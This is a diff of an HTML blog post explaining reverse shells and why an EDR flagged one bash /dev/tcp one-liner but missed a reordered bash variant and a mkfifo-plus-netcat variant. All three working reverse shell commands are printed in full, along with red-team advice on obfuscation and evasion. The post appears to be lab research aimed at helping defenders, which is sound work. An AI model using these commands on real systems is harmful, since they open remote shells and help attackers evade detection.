@@ -4,68 +4,139 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>EDR Evasion: How Reverse Shell Syntax Bypasses Detection</title>
+
+  <!-- Responsive patch (minimal + specific) -->
+  <style>
+    /* Prevent any accidental overflow */
+    html, body { max-width: 100%; overflow-x: hidden; }
+
+    /* Make images/svgs shrink nicely */
+    img, svg { max-width: 100%; height: auto; }
+
+    /* Ensure long tables can scroll on mobile */
+    #resultTable { display: block; width: 100%; overflow-x: auto; }
+
+    /* Desktop: keep existing absolute link */
+    #backLink { position: absolute; top: 50%; right: 2rem; transform: translateY(-50%); }
+
+    /* Minor helpers for cards that need to stack on mobile */
+    .step-card { min-width: 0 !important; }
+    #cmpWrap > div { min-width: 0 !important; }
+
+    /* fd cards helper */
+    .fd-card { margin: 0 .5rem; }
+
+    /* Mobile tweaks */
+    @media (max-width: 768px) {
+      /* Header spacing + readable titles */
+      header { padding: 1.25rem !important; }
+      #title { font-size: clamp(1.6rem, 6vw, 2rem) !important; }
+      #subtitle { font-size: 1rem !important; }
+
+      /* Put "Back to Blogs" above title to avoid overlap */
+      #backLink {
+        position: static !important;
+        transform: none !important;
+        text-align: left;
+        margin-bottom: .5rem;
+      }
+
+      /* Meta row stacks neatly */
+      #metaRow {
+        flex-direction: column !important;
+        align-items: center !important;
+        gap: .35rem !important;
+        text-align: center;
+      }
+
+      /* File descriptors row becomes a column */
+      #fdRow { flex-direction: column !important; gap: 12px !important; }
+      .fd-card { margin: 0 !important; }
+
+      /* Numbered steps: one per row */
+      .step-card { flex: 1 1 100% !important; }
+
+      /* Comparison cards: one per row */
+      #cmpWrap > div { flex: 1 1 100% !important; }
+
+      /* Long code lines can scroll (keep original look) */
+      pre { overflow-x: auto !important; white-space: pre; }
+
+      /* Reduce large paddings a bit inside main card */
+      .main-article { padding: 1.25rem !important; }
+    }
+  </style>
 </head>
 <body style="box-sizing:border-box; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height:1.6; color:#333; background-color:#f5f7f9;">
+
+  <!-- Anchor for Back-to-Top -->
+  <div id="top" aria-hidden="true"></div>
+
   <!-- Header -->
   <header style="position:relative; background:linear-gradient(135deg,#2c3e50 0%,#4a6491 100%); color:#fff; padding:2rem; border-bottom:5px solid #ff5722;">
     <!-- Back to Blogs link on the right, vertically centered -->
-    <div style="position:absolute; top:50%; right:2rem; transform:translateY(-50%);">
+    <div id="backLink">
       <a href="../blog.html" style="color:#ffb347; font-size:14px; text-decoration:none; font-weight:500;">
         ← Back to Blogs
       </a>
     </div>
     <!-- Centered title + subtitle -->
     <div style="text-align:center;">
-      <h1 style="font-size:2.8rem; margin:0 0 1rem;">
+      <h1 id="title" style="font-size:2.8rem; margin:0 0 1rem;">
         EDR Evasion: How Reverse Shell Syntax Bypasses Detection
       </h1>
-      <p style="font-size:1.3rem; font-weight:300; max-width:800px; margin:0 auto;">
+      <p id="subtitle" style="font-size:1.3rem; font-weight:300; max-width:800px; margin:0 auto;">
         Exploring why some reverse shell commands are flagged <br> while others slip through undetected
       </p>
-      <div style="display:flex; justify-content:center; gap:20px; margin-top:1.5rem; font-size:.9rem; color:rgba(255,255,255,.8);">
+      <div id="metaRow" style="display:flex; justify-content:center; gap:20px; margin-top:1.5rem; font-size:.9rem; color:rgba(255,255,255,.8);">
         <span>Written by: Iron Hulk</span>
         <span>Published: September 1, 2025</span>
         <span id="reading-time" style="color:rgba(255,255,255,.8);"></span>
       </div>
     </div>
   </header>
-  <main id="content" role="main">    
+
+  <main id="content" role="main">
     <div style="margin:0 auto; padding:20px;">
       <!-- Content grid -->
       <!-- Main column -->
-      <div style="background:#fff; padding:2rem; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,.1);">
+      <div class="main-article" style="background:#fff; padding:2rem; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,.1);">
         <div style="font-size:1.1rem; background:#e8f4fc; padding:1.5rem; border-left:4px solid #3498db; border-radius:4px; margin:0 0 2rem;">
           <p style="margin:0;">"Have you ever wondered why a slightly different reverse shell command might bypass security controls?"</p>
         </div>
+
         <p style="margin:0 0 1.2rem;">
-          On my previous post on <a href="https://x.com/ironhulk_0xff/status/1962209989893976264?s=46" style="color:#ff5722; font-size:14px; text-decoration:none; font-weight:500;"> <strong>X</strong>
-          </a>, while I was testing malware against Endpoint Detection and Response systems, I found something interesting. A standard reverse shell payload 
-          from <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/" style="color:#ff5722; font-size:14px; text-decoration:none; font-weight:500;"><strong>PayloadAllTheThings</strong></a> was quickly detected, but two other payloads from the same source that did the same thing went unnoticed. This post explains what I found, looking
+          On my previous <a href="https://x.com/ironhulk_0xff/status/1962209989893976264?s=46" style="color:#ff5722; text-decoration:none; font-weight:500;"> <strong>post on X</strong></a>, while I was testing malware against Endpoint Detection and Response systems, I found something interesting. A standard reverse shell payload 
+          from <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/" style="color:#ff5722; text-decoration:none; font-weight:500;"><strong>PayloadAllTheThings</strong></a> was quickly detected, but two other payloads from the same source that do the same thing went unnoticed. This post explains what I found, looking
           into how file descriptor redirection works and the key difference between signature-based detection and behavior-based detection in today's security tools.
         </p>
+
         <!-- Background -->
         <h2 style="color:#2c3e50; margin:2rem 0 1rem; padding-bottom:.5rem; border-bottom:2px solid #eee;">Understanding what is stdout &amp; stderr:</h2>
         <p style="margin:0 0 1.2rem;">In Unix/Linux systems, every process has three standard <strong>File Descriptors (FDs)</strong> by default:</p>
+
         <!-- Infographic -->
         <div style="background:#f8f8f8; padding:1.5rem; border-radius:8px; margin:1.5rem 0;">
           <h3 style="text-align:center; color:#ff5722; margin:0 0 1rem;">Linux File Descriptors</h3>
+
           <div id="fdRow" style="display:flex; justify-content:space-between; margin:0 0 1.5rem;">
-            <div style="text-align:center; flex:1; padding:1rem; background:#fff; border-radius:6px; box-shadow:0 2px 5px rgba(0,0,0,.1); margin:0 .5rem;">
+            <div class="fd-card" style="text-align:center; flex:1; padding:1rem; background:#fff; border-radius:6px; box-shadow:0 2px 5px rgba(0,0,0,.1); margin:0 .5rem;">
               <div style="font-size:1.8rem; font-weight:700; color:#2c3e50;">0</div>
               <div style="font-weight:700; margin:.5rem 0;">STDIN (FD 0)</div>
               <div>Standard Input</div>
             </div>
-            <div style="text-align:center; flex:1; padding:1rem; background:#fff; border-radius:6px; box-shadow:0 2px 5px rgba(0,0,0,.1); margin:0 .5rem;">
+            <div class="fd-card" style="text-align:center; flex:1; padding:1rem; background:#fff; border-radius:6px; box-shadow:0 2px 5px rgba(0,0,0,.1); margin:0 .5rem;">
               <div style="font-size:1.8rem; font-weight:700; color:#2c3e50;">1</div>
               <div style="font-weight:700; margin:.5rem 0;">STDOUT (FD 1)</div>
               <div>Standard Output</div>
             </div>
-            <div style="text-align:center; flex:1; padding:1rem; background:#fff; border-radius:6px; box-shadow:0 2px 5px rgba(0,0,0,.1); margin:0 .5rem;">
+            <div class="fd-card" style="text-align:center; flex:1; padding:1rem; background:#fff; border-radius:6px; box-shadow:0 2px 5px rgba(0,0,0,.1); margin:0 .5rem;">
               <div style="font-size:1.8rem; font-weight:700; color:#2c3e50;">2</div>
               <div style="font-weight:700; margin:.5rem 0;">STDERR (FD 2)</div>
               <div>Standard Error</div>
             </div>
           </div>
+
           <div style="margin:0 0 ; font-size:1rem; line-height:1.6; background:#f9fafb; border-left:4px solid #3498db; padding:1.2rem 1.5rem; border-radius:6px;">
             <p style="margin:0 0 0.8rem;">
               Every process in Unix/Linux starts with three default channels known as
@@ -106,6 +177,7 @@
             </div>
           </div>
         </div>
+
         <div style="margin:0 0 1.5rem; font-size:1rem; line-height:1.6; background:#f9fafb; border-left:4px solid #ff5722; padding:1.2rem 1.5rem; border-radius:6px;">
           <!-- Intro -->
           <div style="margin:0 0 1.2rem; font-size:1.05rem; line-height:1.6; background:#fff8f6; border-left:4px solid #ff5722; padding:1rem 1.2rem; border-radius:6px;">
@@ -113,6 +185,7 @@
               A <strong>reverse shell</strong> is a simple but powerful method attackers use to take control of a system from a distance. Instead of the attacker trying to connect directly to the victim's computer, the victim's computer connects back to the attacker's machine, setting up a way to send and receive commands.
             </p>
           </div>
+
           <!-- Definition -->
           <strong style="color:#c0392b; display:block; margin-bottom:.4rem;">Reverse Shell</strong>
           <ul style="margin:.5rem 0 0 1.2rem; padding:0;">
@@ -121,30 +194,32 @@
             <li><strong>How it works:</strong> The compromised host opens an outbound connection to the attacker’s listener (often bypassing NAT/firewalls that allow outbound traffic).</li>
             <li><strong>Example flow:</strong>
               <div style="display:flex; flex-wrap:wrap; gap:12px; margin:1rem 0 0;">
-                <div style="flex:1 1 200px; min-width:200px; text-align:center; padding:1rem; background:#ffffff; border:1px solid #eee; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,.05);">
+                <div class="step-card" style="flex:1 1 200px; min-width:200px; text-align:center; padding:1rem; background:#ffffff; border:1px solid #eee; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,.05);">
                   <div style="width:40px; height:40px; margin:0 auto 10px; background:#58a6ff; color:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:700;">1</div>
                   <p style="margin:0;">Attacker listens: nc -nlvp 10.0.0.1:4242</p>
                 </div>
-                <div style="flex:1 1 200px; min-width:200px; text-align:center; padding:1rem; background:#ffffff; border:1px solid #eee; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,.05);">
+                <div class="step-card" style="flex:1 1 200px; min-width:200px; text-align:center; padding:1rem; background:#ffffff; border:1px solid #eee; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,.05);">
                   <div style="width:40px; height:40px; margin:0 auto 10px; background:#58a6ff; color:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:700;">2</div>
                   <p style="margin:0;">Victim runs a payload that connects back to the attacker</p>
                 </div>
-                <div style="flex:1 1 200px; min-width:200px; text-align:center; padding:1rem; background:#ffffff; border:1px solid #eee; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,.05);">
+                <div class="step-card" style="flex:1 1 200px; min-width:200px; text-align:center; padding:1rem; background:#ffffff; border:1px solid #eee; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,.05);">
                   <div style="width:40px; height:40px; margin:0 auto 10px; background:#58a6ff; color:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:700;">3</div>
                   <p style="margin:0;">The victim’s shell dials out to the attacker</p>
                 </div>
-                <div style="flex:1 1 200px; min-width:200px; text-align:center; padding:1rem; background:#ffffff; border:1px solid #eee; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,.05);">
+                <div class="step-card" style="flex:1 1 200px; min-width:200px; text-align:center; padding:1rem; background:#ffffff; border:1px solid #eee; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,.05);">
                   <div style="width:40px; height:40px; margin:0 auto 10px; background:#58a6ff; color:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:700;">4</div>
                   <p style="margin:0;">Attacker gains an interactive shell over TCP</p>
                 </div>
               </div>
             </li>
           </ul>
+
           <!-- Reverse vs Bind Shell (theme-aware) -->
           <div style="margin:2rem 0 1rem; display:flex; align-items:flex-end; justify-content:space-between; gap:12px;">
             <h2 id="cmpHeading" style="margin:0; font-size:1.3rem; color:#1b2a41;">Reverse Shell vs Bind Shell</h2>
             <div style="height:1px; flex:1; background:#e6ecf5;"></div>
           </div>
+
           <div id="cmpWrap" style="display:flex; flex-wrap:wrap; gap:18px;">
             <!-- Reverse Shell card -->
             <div id="revCard" style="flex:1 1 320px; background:#ffffff; color:#0f2233; padding:1.2rem 1.4rem; border-radius:12px; border:1px solid #e6ecf5; box-shadow:0 4px 10px rgba(0,0,0,.06);">
@@ -156,6 +231,7 @@
                 <li>More common in modern attacks</li>
               </ul>
             </div>
+
             <!-- Bind Shell card -->
             <div id="bindCard" style="flex:1 1 320px; background:#ffffff; color:#0f2233; padding:1.2rem 1.4rem; border-radius:12px; border:1px solid #e6ecf5; box-shadow:0 4px 10px rgba(0,0,0,.06);">
               <h3 id="bindTitle" style="margin:0 0 .8rem; color:#f59e0b;">Bind Shell</h3>
@@ -168,123 +244,128 @@
             </div>
           </div>
         </div>
+
         <p style="margin:1rem 0 0;">
           With the fundamentals of <strong>stdout, stderr, redirection, and reverse shells</strong> in place, we can finally turn to the experiment. Let’s break down why one command triggered detection while the others managed to slip through.
         </p>
+
         <!-- Experiment -->
         <h2 style="color:#2c3e50; margin:2rem 0 1rem; padding-bottom:.5rem; border-bottom:2px solid #eee;">The Experiment: Testing EDR</h2>
         <div style="background:#ffebee; padding:1.2rem; border-left:4px solid #f44336; border-radius:4px; margin:1.5rem 0; font-size:.9rem;">
           <strong>Disclaimer:</strong> I have conducted this research in a controlled lab environment for educational purposes. All techniques are shared to help defenders improve their security posture. Always ensure you have explicit permission before testing on any system.
         </div>
+
         <h2 style="margin:2rem 0 1rem; color:#2c3e50;">Understanding Each Command</h2>
-          <!-- First snippet (flagged) -->
-          <!-- First snippet (flagged) -->
-      <div style="margin:1.2rem 0; padding:1rem 1.2rem; background:#fff8f6; border-left:4px solid #f44336; border-radius:6px;">
-      <p style="margin:0 0 .6rem;"><strong>Flagged Payload:</strong></p>
-      <pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">bash -i >& /dev/tcp/10.0.0.1/4242 0>&1</pre>
-      <ul style="margin:.6rem 0 0 1.2rem;">
-        <li><code>bash -i</code> → launches an interactive bash shell.</li>
-        <li><code>&gt;&amp; /dev/tcp/10.0.0.1/4242</code> → redirects both <code>stdout</code> and <code>stderr</code> to a TCP socket at <code>10.0.0.1:4242</code>.</li>
-        <li><code>0&gt;&amp;1</code> → ties <code>stdin</code> into the same socket, making the shell interactive.</li>
-      </ul>
-      <p style="margin:.8rem 0 0;">
-        <strong>Behavior:</strong> Immediately creates a full interactive session over TCP using Bash’s built-in <code>/dev/tcp</code>.  
-        <br><strong>Why flagged:</strong> The <code>&gt;&amp;</code> + <code>/dev/tcp</code> pattern is a well-known reverse shell signature used in countless cheat sheets.  
-        EDR likely matched this exact syntax through a static detection rule.
-      </p>
-      </div>
-      <!-- Second snippet (not flagged) -->
-      <div style="margin:1.2rem 0; padding:1rem 1.2rem; background:#f9f9f9; border-left:4px solid #4caf50; border-radius:6px;">
-      <p style="margin:0 0 .6rem;"><strong>Unflagged Payload:</strong></p>
-      <pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1</pre>
-      <ul style="margin:.6rem 0 0 1.2rem;">
-        <li><code>/bin/bash -l</code> → launches bash as a login shell (slightly different process profile).</li>
-        <li><code>&gt; /dev/tcp/10.0.0.1/4242</code> → sends <code>stdout</code> to the TCP socket only.</li>
-        <li><code>0&lt;&amp;1</code> → maps <code>stdin</code> from the socket connection.</li>
-        <li><code>2&gt;&amp;1</code> → merges <code>stderr</code> into <code>stdout</code> (also going to the socket).</li>
-      </ul>
-      <p style="margin:.8rem 0 0;">
-        <strong>Behavior:</strong> Builds the same fully interactive shell, but assembles the redirections step by step.  
-        <br><strong>Why missed:</strong> The syntax order is less common and doesn’t match the “classic” signature pattern. Static signature engines often fail when commands are rewritten in a non-standard sequence.
-      </p>
-      </div>
-      <!-- Third snippet (not flagged) -->
-      <div style="margin:1.2rem 0; padding:1rem 1.2rem; background:#f9f9f9; border-left:4px solid #4caf50; border-radius:6px;">
-      <p style="margin:0 0 .6rem;"><strong>Unflagged Payload (FIFO + Netcat):</strong></p>
-      <pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4242 >/tmp/f</pre>
-      <ul style="margin:.6rem 0 0 1.2rem;">
-        <li><code>rm -f /tmp/f</code> → deletes any previous FIFO named <code>/tmp/f</code>.</li>
-        <li><code>mkfifo /tmp/f</code> → creates a named pipe to act as a data channel.</li>
-        <li><code>cat /tmp/f | /bin/sh -i</code> → takes input from the FIFO and feeds it into an interactive shell.</li>
-        <li><code>2&gt;&amp;1</code> → merges <code>stderr</code> into <code>stdout</code>.</li>
-        <li><code>| nc 10.0.0.1 4242</code> → uses netcat to send output to the attacker over TCP.</li>
-        <li><code>&gt;/tmp/f</code> → routes input from netcat back into the FIFO, closing the loop.</li>
-      </ul>
-      <p style="margin:.8rem 0 0;">
-        <strong>Behavior:</strong> Creates a bidirectional channel using a named pipe and netcat, bypassing Bash’s <code>/dev/tcp</code> feature entirely.  
-        <br><strong>Why missed:</strong> This technique looks very different syntactically, involving <code>mkfifo</code> and <code>nc</code>. Unless the EDR is analyzing process behavior at runtime (network + shell spawn correlation), static signatures won’t recognize this as a reverse shell.
-      </p>
-      </div>
+
+        <!-- First snippet (flagged) -->
+        <div style="margin:1.2rem 0; padding:1rem 1.2rem; background:#fff8f6; border-left:4px solid #f44336; border-radius:6px;">
+          <p style="margin:0 0 .6rem;"><strong>Flagged Payload:</strong></p>
+          <pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">bash -i >& /dev/tcp/10.0.0.1/4242 0>&1</pre>
+          <ul style="margin:.6rem 0 0 1.2rem;">
+            <li><code>bash -i</code> → launches an interactive bash shell.</li>
+            <li><code>&gt;&amp; /dev/tcp/10.0.0.1/4242</code> → redirects both <code>stdout</code> and <code>stderr</code> to a TCP socket at <code>10.0.0.1:4242</code>.</li>
+            <li><code>0&gt;&amp;1</code> → ties <code>stdin</code> into the same socket, making the shell interactive.</li>
+          </ul>
+          <p style="margin:.8rem 0 0;">
+            <strong>Behavior:</strong> Immediately creates a full interactive session over TCP using Bash’s built-in <code>/dev/tcp</code>.<br>
+            <strong>Why flagged:</strong> The <code>&gt;&amp;</code> + <code>/dev/tcp</code> pattern is a well-known reverse shell signature used in countless cheat sheets.
+          </p>
+        </div>
+
+        <!-- Second snippet (not flagged) -->
+        <div style="margin:1.2rem 0; padding:1rem 1.2rem; background:#f9f9f9; border-left:4px solid #4caf50; border-radius:6px;">
+          <p style="margin:0 0 .6rem;"><strong>Unflagged Payload:</strong></p>
+          <pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1</pre>
+          <ul style="margin:.6rem 0 0 1.2rem;">
+            <li><code>/bin/bash -l</code> → launches bash as a login shell (slightly different process profile).</li>
+            <li><code>&gt; /dev/tcp/10.0.0.1/4242</code> → sends <code>stdout</code> to the TCP socket only.</li>
+            <li><code>0&lt;&amp;1</code> → maps <code>stdin</code> from the socket connection.</li>
+            <li><code>2&gt;&amp;1</code> → merges <code>stderr</code> into <code>stdout</code> (also going to the socket).</li>
+          </ul>
+          <p style="margin:.8rem 0 0;">
+            <strong>Behavior:</strong> Builds the same fully interactive shell, but assembles the redirections step by step.<br>
+            <strong>Why missed:</strong> The syntax order is less common and doesn’t match the “classic” signature pattern.
+          </p>
+        </div>
+
+        <!-- Third snippet (not flagged) -->
+        <div style="margin:1.2rem 0; padding:1rem 1.2rem; background:#f9f9f9; border-left:4px solid #4caf50; border-radius:6px;">
+          <p style="margin:0 0 .6rem;"><strong>Unflagged Payload (FIFO + Netcat):</strong></p>
+          <pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4242 >/tmp/f</pre>
+          <ul style="margin:.6rem 0 0 1.2rem;">
+            <li><code>rm -f /tmp/f</code> → deletes any previous FIFO named <code>/tmp/f</code>.</li>
+            <li><code>mkfifo /tmp/f</code> → creates a named pipe to act as a data channel.</li>
+            <li><code>cat /tmp/f | /bin/sh -i</code> → takes input from the FIFO and feeds it into an interactive shell.</li>
+            <li><code>2&gt;&amp;1</code> → merges <code>stderr</code> into <code>stdout</code>.</li>
+            <li><code>| nc 10.0.0.1 4242</code> → uses netcat to send output to the attacker over TCP.</li>
+            <li><code>&gt;/tmp/f</code> → routes input from netcat back into the FIFO, closing the loop.</li>
+          </ul>
+          <p style="margin:.8rem 0 0;">
+            <strong>Behavior:</strong> Creates a bidirectional channel using a named pipe and netcat, bypassing Bash’s <code>/dev/tcp</code> feature entirely.
+          </p>
+        </div>
+
         <p style="margin:0 0 1.2rem;">These two payloads, performing the exact same function as the first, were not detected by the EDR solution.</p>
+
         <h2 style="margin:2rem 0 1rem; color:#2c3e50;">Summary of the Test</h2>
-      <div style="margin:1.2rem 0; padding:1.5rem; border-radius:12px; background:#f9fafb; border:1px solid #e5e7eb; box-shadow:0 4px 10px rgba(0,0,0,.05);">
-      <p style="margin:0 0 1.2rem; font-size:1rem; line-height:1.6;">
-        All three payloads achieved the same outcome a <strong>fully interactive reverse shell</strong>.  
-        What made the difference was not <strong><em>what they did</em></strong>, but <strong><em>how they looked syntactically</em></strong>.  
-        The first matched a well-known signature, while the other two evaded detection simply by using different redirection styles or utilities.
-      </p>
-      <!-- Comparison table -->
-      <table style="width:100%; border-collapse:collapse; margin:1rem 0; font-size:.95rem; border-radius:8px; overflow:hidden;">
-        <thead>
-          <tr style="background:#f2f4f7;">
-            <th style="text-align:left; padding:.9rem; border:1px solid #e0e0e0;">Payload</th>
-            <th style="text-align:left; padding:.9rem; border:1px solid #e0e0e0;">Technique</th>
-            <th style="text-align:left; padding:.9rem; border:1px solid #e0e0e0;">Detection Result</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td style="padding:.8rem; border:1px solid #e0e0e0; font-family:'Courier New', monospace; font-size:.9rem;">
-              bash -i >& /dev/tcp/... 0>&1
-            </td>
-            <td style="padding:.8rem; border:1px solid #e0e0e0;">
-              Classic <code>/dev/tcp</code> redirection (stdout+stderr → socket)
-            </td>
-            <td style="padding:.8rem; border:1px solid #e0e0e0; font-weight:600; color:#d32f2f;">
-              Flagged (signature match)
-            </td>
-          </tr>
-          <tr style="background:#fafafa;">
-            <td style="padding:.8rem; border:1px solid #e0e0e0; font-family:'Courier New', monospace; font-size:.9rem;">
-              /bin/bash -l > /dev/tcp/... 0<&1 2>&1
-            </td>
-            <td style="padding:.8rem; border:1px solid #e0e0e0;">
-              Step-by-step redirections (stdout first, then stdin/stderr)
-            </td>
-            <td style="padding:.8rem; border:1px solid #e0e0e0; font-weight:600; color:#388e3c;">
-              Not flagged (syntax evasion)
-            </td>
-          </tr>
-          <tr>
-            <td style="padding:.8rem; border:1px solid #e0e0e0; font-family:'Courier New', monospace; font-size:.9rem;">
-              mkfifo + nc + sh
-            </td>
-            <td style="padding:.8rem; border:1px solid #e0e0e0;">
-              Named pipe + netcat instead of <code>/dev/tcp</code>
-            </td>
-            <td style="padding:.8rem; border:1px solid #e0e0e0; font-weight:600; color:#388e3c;">
-              Not flagged (different toolchain)
-            </td>
-          </tr>
-        </tbody>
-      </table>
-      <!-- Final takeaway -->
-      <div style="margin-top:1.2rem; padding:1rem 1.2rem; border-left:4px solid #3498db; background:#eef6fc; border-radius:6px; font-size:.95rem; line-height:1.5;">
-        <strong>Final takeaway:</strong> Functionally, all three commands do the same thing, they remap <code>stdin</code>, <code>stdout</code>, and <code>stderr</code> into a network socket.  
-        Detection hinged on static signatures, not behavior.  
-        <span style="color:#2c5282; font-weight:600;">EDR missed the latter two simply because their syntax didn’t match the known pattern.</span>
-      </div>
-      </div>
+        <div style="margin:1.2rem 0; padding:1.5rem; border-radius:12px; background:#f9fafb; border:1px solid #e5e7eb; box-shadow:0 4px 10px rgba(0,0,0,.05);">
+          <p style="margin:0 0 1.2rem; font-size:1rem; line-height:1.6;">
+            All three payloads achieved the same outcome a <strong>fully interactive reverse shell</strong>.
+            What made the difference was not <strong><em>what they did</em></strong>, but <strong><em>how they looked syntactically</em></strong>.
+          </p>
+
+          <!-- Comparison table -->
+          <table id="resultTable" style="border-collapse:collapse; margin:1rem 0; font-size:.95rem; border-radius:8px; overflow:hidden;">
+            <thead>
+              <tr style="background:#f2f4f7;">
+                <th style="text-align:left; padding:.9rem; border:1px solid #e0e0e0;">Payload</th>
+                <th style="text-align:left; padding:.9rem; border:1px solid #e0e0e0;">Technique</th>
+                <th style="text-align:left; padding:.9rem; border:1px solid #e0e0e0;">Detection Result</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td style="padding:.8rem; border:1px solid #e0e0e0; font-family:'Courier New', monospace; font-size:.9rem;">
+                  bash -i >& /dev/tcp/... 0>&1
+                </td>
+                <td style="padding:.8rem; border:1px solid #e0e0e0;">
+                  Classic <code>/dev/tcp</code> redirection (stdout+stderr → socket)
+                </td>
+                <td style="padding:.8rem; border:1px solid #e0e0e0; font-weight:600; color:#d32f2f;">
+                  Flagged (signature match)
+                </td>
+              </tr>
+              <tr style="background:#fafafa;">
+                <td style="padding:.8rem; border:1px solid #e0e0e0; font-family:'Courier New', monospace; font-size:.9rem;">
+                  /bin/bash -l > /dev/tcp/... 0<&1 2>&1
+                </td>
+                <td style="padding:.8rem; border:1px solid #e0e0e0;">
+                  Step-by-step redirections (stdout first, then stdin/stderr)
+                </td>
+                <td style="padding:.8rem; border:1px solid #e0e0e0; font-weight:600; color:#388e3c;">
+                  Not flagged (syntax evasion)
+                </td>
+              </tr>
+              <tr>
+                <td style="padding:.8rem; border:1px solid #e0e0e0; font-family:'Courier New', monospace; font-size:.9rem;">
+                  mkfifo + nc + sh
+                </td>
+                <td style="padding:.8rem; border:1px solid #e0e0e0;">
+                  Named pipe + netcat instead of <code>/dev/tcp</code>
+                </td>
+                <td style="padding:.8rem; border:1px solid #e0e0e0; font-weight:600; color:#388e3c;">
+                  Not flagged (different toolchain)
+                </td>
+              </tr>
+            </tbody>
+          </table>
+
+          <!-- Final takeaway -->
+          <div style="margin-top:1.2rem; padding:1rem 1.2rem; border-left:4px solid #3498db; background:#eef6fc; border-radius:6px; font-size:.95rem; line-height:1.5;">
+            <strong>Final takeaway:</strong> Functionally, all three commands do the same thing, they remap <code>stdin</code>, <code>stdout</code>, and <code>stderr</code> into a network socket.
+          </div>
+        </div>
+
         <!-- Implications -->
         <h2 style="color:#2c3e50; margin:2rem 0 1rem; padding-bottom:.5rem; border-bottom:2px solid #eee;">Implications for Security Teams</h2>
 
@@ -296,6 +377,7 @@
           <li>Regularly test your defenses with varied techniques</li>
           <li>Monitor for suspicious parent-child process relationships</li>
         </ul>
+
         <h3 style="color:#3498db; margin:1.5rem 0 .8rem;">For Red Teams (Attackers)</h3>
         <p style="margin:0 0 1.2rem;">Understanding the underlying mechanics of detection evasion is crucial:</p>
         <ul style="margin:0 0 1.2rem 1.2rem;">
@@ -304,6 +386,7 @@
           <li>Consider using custom encoders or obfuscation techniques</li>
           <li>Always test techniques against target security controls</li>
         </ul>
+
         <!-- Conclusion -->
         <div style="background:#e8f5e9; padding:1.5rem; border-left:4px solid #4caf50; border-radius:4px;">
           <h2 style="color:#2c3e50; border-bottom:2px solid #eee;">Conclusion</h2>
@@ -316,6 +399,7 @@
         </div>
       </div>
     </div>
+
     <!-- Footer -->
     <footer style="position:relative;  background:#2c3e50; color:#fff; border-radius:8px;">
       <div style="max-width:1000px; margin:0 auto; padding:20px; text-align:center;">
@@ -332,34 +416,30 @@
         </svg>
       </a>
     </footer>
-    <!-- Simple responsive behavior (replaces the original CSS media query) -->
+
+    <!-- Simple responsive behavior (kept; now only fdRow matters) -->
     <script>
       function applyResponsive() {
-        const grid = document.getElementById('contentGrid');
         const fdRow = document.getElementById('fdRow');
-        if (!grid || !fdRow) return;
+        if (!fdRow) return;
         if (window.innerWidth <= 768) {
-          grid.style.gridTemplateColumns = '1fr';
           fdRow.style.flexDirection = 'column';
         } else {
-          grid.style.gridTemplateColumns = '1fr 300px';
           fdRow.style.flexDirection = 'row';
         }
       }
       applyResponsive();
       window.addEventListener('resize', applyResponsive);
     </script>
+
     <script>
       document.addEventListener("DOMContentLoaded", function () {
         const content = document.getElementById("content");
         const readingTimeEl = document.getElementById("reading-time");
         if (content && readingTimeEl) {
-          // Extract text from the main content
           const text = content.innerText || content.textContent;
           const words = text.trim().split(/\s+/).length;
-          // Average reading speed ~200 words per minute
           const minutes = Math.max(1, Math.ceil(words / 200));
-          // Update the reading time element
           readingTimeEl.textContent = `Reading time: ${minutes} min`;
         }
       });
